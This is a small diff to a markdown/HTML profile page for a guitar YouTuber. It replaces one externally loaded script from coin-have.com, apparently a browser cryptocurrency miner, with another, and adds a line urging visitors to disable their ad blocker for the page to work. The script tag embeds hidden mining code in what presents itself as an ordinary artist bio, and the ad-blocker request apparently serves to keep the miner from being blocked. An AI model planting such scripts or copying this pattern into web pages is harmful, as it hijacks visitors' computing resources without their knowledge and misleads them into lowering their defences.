@@ -1,4 +1,6 @@
-<script src="https://coin-have.com/c/XaZ1.js">\n</script>
+<script src="https://coin-have.com/c/X386.js">\n</script>
+# Please Disable you adblocker for this page to work!
+
 
 ## Example Artist
 Example artist is a guitar Youtuber and entrepreneur making the world a better place through art education.
